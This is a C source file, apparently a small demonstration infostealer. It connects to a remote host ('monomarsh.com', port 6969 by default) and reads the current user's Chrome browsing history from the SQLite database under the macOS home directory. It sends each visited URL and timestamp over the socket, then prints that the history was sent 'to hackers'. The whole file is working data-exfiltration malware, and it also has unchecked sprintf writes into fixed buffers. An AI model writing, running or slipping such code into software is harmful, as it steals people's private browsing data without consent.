#include <sys/utsname.h>
#include <sqlite3.h>
#include <netdb.h>
#include <pwd.h>

#include "network.h"

int sockfd;

size_t handle_arguments(int argc, char **argv, char **hostname) {
    int option;
    size_t port = 0;

    while ((option = getopt(argc, argv, "p:h:")) != -1) {
        switch (option) {
            case 'p':
                port = atoi(optarg);
                break;
            case 'h':
                *hostname = optarg;
                break;
            case '?':
                fprintf(stderr, "invalid option: %c.\n", optopt);
                exit(1);
            default:
                fprintf(stderr, "unknown option: %c.\n", option);
                exit(1);
        }
    }

    for (int index = optind; index < argc; index++) {
        printf ("unknown option: %s\n", argv[index]);
    }
    if (optind < argc) exit(1);
    
    if (port == 0) port = 6969;
    return port;
}

static int callback(void* data, int argc, char** argv, char** col_name) {
    char buffer[1024];
    if (argc > 1) sprintf(buffer, "%s,%s\r\n", argv[1], argv[0]);

    send_line(sockfd, buffer);
    return 0;
}

void extract_my_data() {
    sqlite3 *database;
    char *error_message = 0;
    char *home_directory;

    struct passwd *pwd = getpwuid(getuid());
    if (pwd) home_directory = pwd->pw_dir;

    char history_path[128];
    sprintf(history_path, "%s/Library/Application Support/Google/Chrome/Default/History", home_directory);

    if (sqlite3_open(history_path, &database)) {
        fprintf(stderr, "failed to open database: %s.\n", sqlite3_errmsg(database));
        sqlite3_close(database);
        exit(1);
    }

    char *command = "SELECT url, last_visit_time FROM urls WHERE last_visit_time IS NOT NULL ORDER BY last_visit_time DESC";
    if (sqlite3_exec(database, command, callback, 0, &error_message)) {
        fprintf(stderr, "SQL error: %s.\n", error_message);
        sqlite3_free(error_message);
        sqlite3_close(database);
        exit(1);
    }

    sqlite3_close(database);
}

int main(int argc, char **argv) {
    char *hostname = "monomarsh.com";
    size_t port = handle_arguments(argc, argv, &hostname);

    struct utsname uname_data;
    if (uname(&uname_data) == -1) panic("failed to get system data");
    char platform[16];
    sprintf(platform, "%s-%s\r\n", uname_data.sysname, uname_data.machine);
    
    struct hostent *host = gethostbyname(hostname);
    if (host == NULL) panic("failed to resolve host");

    sockfd = open_socket();

    struct sockaddr_in server;
    server.sin_addr = *((struct in_addr *)host->h_addr);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    if (connect(sockfd, (struct sockaddr*)&server, sizeof(server)) < 0) panic("failed to connect to server");

    extract_my_data();

    printf("sent system information and chrome history to hackers. goodbye!\n");
    close(sockfd);
    return 0;
}
